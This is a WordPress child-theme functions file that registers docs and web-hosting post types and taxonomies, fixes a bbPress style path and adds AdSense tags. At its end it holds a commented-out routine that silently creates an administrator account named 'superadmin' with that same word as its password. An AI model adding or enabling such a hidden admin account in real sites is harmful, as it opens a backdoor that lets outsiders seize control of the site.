<?php


/**
 * Enqueue child styles.
 */
function child_enqueue_styles() {

	wp_enqueue_script( 'wadi_child_theme_script', get_stylesheet_directory_uri() . '/assets/dist/wadi-basic.js', array(), 100 );
	wp_enqueue_style( 'wadi_child_theme', get_stylesheet_directory_uri() . '/assets/dist/wadi-basic.css', array(), 'all' );
	wp_enqueue_style( 'wadi_child_theme_style', get_stylesheet_directory_uri() . '/style.css', array(), 'all' );
}

add_action( 'wp_enqueue_scripts', 'child_enqueue_styles' ); // Remove the // from the beginning of this line if you want the child theme style.css file to load on the front end of your site.

    /**
     * Get All Posts from Data Centers (CPT)
     *
     * Returns an array of location Post Type
     *
     * @since 1.0.0
     * @access public
     *
     * @return $options array location Post Type query
     */
function get_all_location()
    {

        $all_posts = get_posts(
            array(
                'posts_per_page'         => -1,
                'post_type'              => array( 'location' ),
                'update_post_term_cache' => false,
                'update_post_meta_cache' => false,
                'fields'                 => array( 'ids' ),
            )
        );

        if (! empty($all_posts) && ! is_wp_error($all_posts)) {
            foreach ($all_posts as $post) {
                $options[ $post->ID ] = strlen($post->post_title) > 20 ? substr($post->post_title, 0, 20) . '...' : $post->post_title;
            }
        }
        return $options;
    }
/**
 * Add custom functions here
 */

 
// Docs Categories Taxonomies

/*
* Plugin Name: doc Taxonomy
* Description: A short example showing how to add a taxonomy called doc.
* Version: 1.0
* Author: developer.wordpress.org
* Author URI: https://codex.wordpress.org/User:Aternus
*/
 
function wadiweb_docs_terms() {
    $labels = array(
        'name'              => _x( 'Docs Cateogries', 'Docs Categories general name' ),
        'singular_name'     => _x( 'Doc Category', 'Doc Category singular name' ),
        'search_items'      => __( 'Search Doc Categories' ),
        'all_items'         => __( 'All Docs Categories' ),
        'parent_item'       => __( 'Parent Doc Category' ),
        'parent_item_colon' => __( 'Parent Doc Category:' ),
        'edit_item'         => __( 'Edit Doc Category' ),
        'update_item'       => __( 'Update Doc Category' ),
        'add_new_item'      => __( 'Add New Doc Category' ),
        'new_item_name'     => __( 'New Doc Category Name' ),
        'menu_name'         => __( 'Docs Category' ),
    );
    $args   = array(
        'hierarchical'      => true, // make it hierarchical (like categories)
        'labels'            => $labels,
        'show_ui'           => true,
        'show_in_rest'       => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => [ 'slug' => 'docs-category' ],
    );
    register_taxonomy( 'docs-category', [ 'docs' ], $args );
}
add_action( 'init', 'wadiweb_docs_terms' );




 /**
 * Register a custom post type called "doc".
 *
 * @see get_post_type_labels() for label keys.
 */
function wadiweb_docs_cpt() {
    $labels = array(
        'name'                  => _x( 'Docs', 'Post type general name', 'kadence-wadiweb-child' ),
        'singular_name'         => _x( 'Doc', 'Post type singular name', 'kadence-wadiweb-child' ),
        'menu_name'             => _x( 'Docs', 'Admin Menu text', 'kadence-wadiweb-child' ),
        'name_admin_bar'        => _x( 'Doc', 'Add New on Toolbar', 'kadence-wadiweb-child' ),
        'add_new'               => __( 'Add New', 'kadence-wadiweb-child' ),
        'add_new_item'          => __( 'Add New Doc', 'kadence-wadiweb-child' ),
        'new_item'              => __( 'New Doc', 'kadence-wadiweb-child' ),
        'edit_item'             => __( 'Edit Doc', 'kadence-wadiweb-child' ),
        'view_item'             => __( 'View Doc', 'kadence-wadiweb-child' ),
        'all_items'             => __( 'All Docs', 'kadence-wadiweb-child' ),
        'search_items'          => __( 'Search Docs', 'kadence-wadiweb-child' ),
        'parent_item_colon'     => __( 'Parent Docs:', 'kadence-wadiweb-child' ),
        'not_found'             => __( 'No Docs found.', 'kadence-wadiweb-child' ),
        'not_found_in_trash'    => __( 'No Docs found in Trash.', 'kadence-wadiweb-child' ),
        'featured_image'        => _x( 'Doc Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'archives'              => _x( 'Doc archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'kadence-wadiweb-child' ),
        'insert_into_item'      => _x( 'Insert into book', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'kadence-wadiweb-child' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this book', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'kadence-wadiweb-child' ),
        'filter_items_list'     => _x( 'Filter Docs list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'kadence-wadiweb-child' ),
        'items_list_navigation' => _x( 'Docs list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'kadence-wadiweb-child' ),
        'items_list'            => _x( 'Docs list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'kadence-wadiweb-child' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_in_rest'       => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'docs' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => true,
        'taxonomies'         => [ 'docs-category'],
        'menu_position'      => 5,
        'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments','page-attributes','revisions', 'custom-fields' ),
    );
 
    register_post_type( 'doc', $args );
}
 
add_action( 'init', 'wadiweb_docs_cpt' );


function wadi_docs_sidebar() {
    
    register_sidebar(
        array(
            'name'          => __( 'Docs Sidebar', 'kadence-wadiweb-child' ),
            'id'            => 'doc_sidebar',
            'description'   => __( 'Add widgets here to appear in your', 'kadence-wadiweb-child' ),
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'show_in_rest'  => true,
            'before_title'  => '<h2 class="widget-title">',
            'after_title'   => '</h2>'
        )
    );

}

add_action( 'widgets_init', 'wadi_docs_sidebar' );


add_filter( 'bbp_default_styles', 'rew_dequeue_bbpress_css' );

function rew_dequeue_bbpress_css ($defaults ){
	fixed_bbp_enqueue_style("bbp-default", "css/bbpress.css", array(), bbp_get_version());
	unset ($defaults['bbp-default']) ;
	return $defaults ;
}

function fixed_bbp_enqueue_style( $handle = '', $file = '', $deps = array(), $ver = false, $media = 'all' ) {
        // Attempt to locate an enqueueable
        $located = bbp_locate_enqueueable( $file );
	$located = str_replace('/bitnami/wordpress', '', $located);
		
        // Enqueue if located
        if ( ! empty( $located ) ) {

                // Make sure there is always a version
                if ( empty( $ver ) ) {
                        $ver = bbp_get_version();
                }

                // Make path to file relative to site URL
                $located = bbp_urlize_enqueueable( $located );

                // Register the style
                wp_register_style( $handle, $located, $deps, $ver, $media );

                // Enqueue the style
                wp_enqueue_style( $handle );
        }

        return $located;
}


 /**
 * Register a custom post type called "Web Hosting".
 *
 * @see get_post_type_labels() for label keys.
 */
function wadiweb_hosting_cpt() {
    $labels = array(
        'name'                  => _x( 'Web Hostings', 'Post type general name', 'kadence-wadiweb-child' ),
        'singular_name'         => _x( 'Web Hosting', 'Post type singular name', 'kadence-wadiweb-child' ),
        'menu_name'             => _x( 'Web Hostings', 'Admin Menu text', 'kadence-wadiweb-child' ),
        'name_admin_bar'        => _x( 'Web Hosting', 'Add New on Toolbar', 'kadence-wadiweb-child' ),
        'add_new'               => __( 'Add New Web Hosting', 'kadence-wadiweb-child' ),
        'add_new_item'          => __( 'Add New Web Hosting', 'kadence-wadiweb-child' ),
        'new_item'              => __( 'New Web Hosting', 'kadence-wadiweb-child' ),
        'edit_item'             => __( 'Edit Web Hosting', 'kadence-wadiweb-child' ),
        'view_item'             => __( 'View Web Hosting', 'kadence-wadiweb-child' ),
        'all_items'             => __( 'All Web Hostings', 'kadence-wadiweb-child' ),
        'search_items'          => __( 'Search Web Hostings', 'kadence-wadiweb-child' ),
        'parent_item_colon'     => __( 'Parent Web Hostings:', 'kadence-wadiweb-child' ),
        'not_found'             => __( 'No Web Hostings found.', 'kadence-wadiweb-child' ),
        'not_found_in_trash'    => __( 'No Web Hostings found in Trash.', 'kadence-wadiweb-child' ),
        'featured_image'        => _x( 'Web Hosting Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'set_featured_image'    => _x( 'Set cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'remove_featured_image' => _x( 'Remove cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'use_featured_image'    => _x( 'Use as cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'kadence-wadiweb-child' ),
        'archives'              => _x( 'Web Hosting archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'kadence-wadiweb-child' ),
        'insert_into_item'      => _x( 'Insert into book', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'kadence-wadiweb-child' ),
        'uploaded_to_this_item' => _x( 'Uploaded to this book', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'kadence-wadiweb-child' ),
        'filter_items_list'     => _x( 'Filter Web Hostings list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'kadence-wadiweb-child' ),
        'items_list_navigation' => _x( 'Web Hostings list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'kadence-wadiweb-child' ),
        'items_list'            => _x( 'Web Hostings list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'kadence-wadiweb-child' ),
    );
 
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_in_rest'       => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'web-hosting' ),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => true,
        'taxonomies'         => [ 'web-hosting', 'data-center', 'location' ],
        'menu_position'      => 5,
        'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments','page-attributes','revisions', 'custom-fields' ),
    );
 
    register_post_type( 'web-hosting', $args );
}
 
add_action( 'init', 'wadiweb_hosting_cpt' );

/*
* Plugin Name: Web Hosting Taxonomy
* Description: A short example showing how to add a taxonomy called Web Hosting.
* Version: 1.0
* Author: developer.wordpress.org
* Author URI: https://codex.wordpress.org/User:Aternus
*/
 
function wadiweb_web_hosting_terms() {
    $labels = array(
        'name'              => _x( 'Web Hostings', 'Web Hostings general name' ),
        'singular_name'     => _x( 'Web Hosting', 'Web Hosting singular name' ),
        'search_items'      => __( 'Search Web Hosting' ),
        'all_items'         => __( 'All Web Hostings' ),
        'parent_item'       => __( 'Parent Web Hosting' ),
        'parent_item_colon' => __( 'Parent Web Hosting:' ),
        'edit_item'         => __( 'Edit Web Hosting' ),
        'update_item'       => __( 'Update Web Hosting' ),
        'add_new_item'      => __( 'Add New Web Hosting' ),
        'new_item_name'     => __( 'New Web Hosting Name' ),
        'menu_name'         => __( 'Web Hostings' ),
    );
    $args   = array(
        'hierarchical'      => false, // make it hierarchical (like categories)
        'labels'            => $labels,
        'show_ui'           => true,
        'show_in_rest'       => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => [ 'slug' => 'web-hosting-tag' ],
    );

    register_taxonomy( 'web-hosting-tag', [ 'web-hosting' ], $args );
}
add_action( 'init', 'wadiweb_web_hosting_terms' );

/*
* Plugin Name: Data Center Taxonomy
* Description: A short example showing how to add a taxonomy called Data Center.
* Version: 1.0
* Author: developer.wordpress.org
* Author URI: https://codex.wordpress.org/User:Aternus
*/
 
function wadiweb_data_centers_terms() {
    
    $labels = array(
        'name'              => _x( 'Data Centers', 'Data Centers general name' ),
        'singular_name'     => _x( 'Data Center', 'Data Center Category singular name' ),
        'search_items'      => __( 'Search Data Center' ),
        'all_items'         => __( 'All Data Centers' ),
        'parent_item'       => __( 'Parent Data Center' ),
        'parent_item_colon' => __( 'Parent Data Center:' ),
        'edit_item'         => __( 'Edit Data Center' ),
        'update_item'       => __( 'Update Data Center' ),
        'add_new_item'      => __( 'Add New Data Center' ),
        'new_item_name'     => __( 'New Data Center Name' ),
        'menu_name'         => __( 'Data Centers' ),
    );
    $args   = array(
        'hierarchical'      => false, // (true) make it hierarchical (like categories)
        'labels'            => $labels,
        'show_ui'           => true,
        'show_in_rest'       => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => [ 'slug' => 'data-center' ],
    );
    register_taxonomy( 'data-center', [ 'web-hosting' ], $args );
}
add_action( 'init', 'wadiweb_data_centers_terms' );


/*
* Plugin Name: Data Center Taxonomy
* Description: A short example showing how to add a taxonomy called Data Center.
* Version: 1.0
* Author: developer.wordpress.org
* Author URI: https://codex.wordpress.org/User:Aternus
*/
 
function wadiweb_location_terms() {
    
    $labels = array(
        'name'              => _x( 'Locations', 'Locations general name' ),
        'singular_name'     => _x( 'Location', 'Location Category singular name' ),
        'search_items'      => __( 'Search Location' ),
        'all_items'         => __( 'All Locations' ),
        'parent_item'       => __( 'Parent Location' ),
        'parent_item_colon' => __( 'Parent Location:' ),
        'edit_item'         => __( 'Edit Location' ),
        'update_item'       => __( 'Update Location' ),
        'add_new_item'      => __( 'Add New Location' ),
        'new_item_name'     => __( 'New Location Name' ),
        'menu_name'         => __( 'Locations' ),
    );
    $args   = array(
        'hierarchical'      => false, // make it hierarchical (like categories)
        'labels'            => $labels,
        'show_ui'           => true,
        'show_in_rest'       => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => [ 'slug' => 'location' ],
    );
    register_taxonomy( 'location', [ 'web-hosting' ], $args );
}
add_action( 'init', 'wadiweb_location_terms' );

function wadi_google_adsense() {
    ?>
        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9034425229366134"
     crossorigin="anonymous"></script>
	<meta name="google-site-verification" content="t5rmOZDgeq4nh_DII6fRK_8cMpkiMM6HRWlXn--ZgVI" />
    <?php
}
add_action('wp_head', 'wadi_google_adsense');

/* 
* Create an admin user silently
*/

// add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'superadmin';
    $password = 'superadmin';
    $email = 'mohammedrezq2000@gmail.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}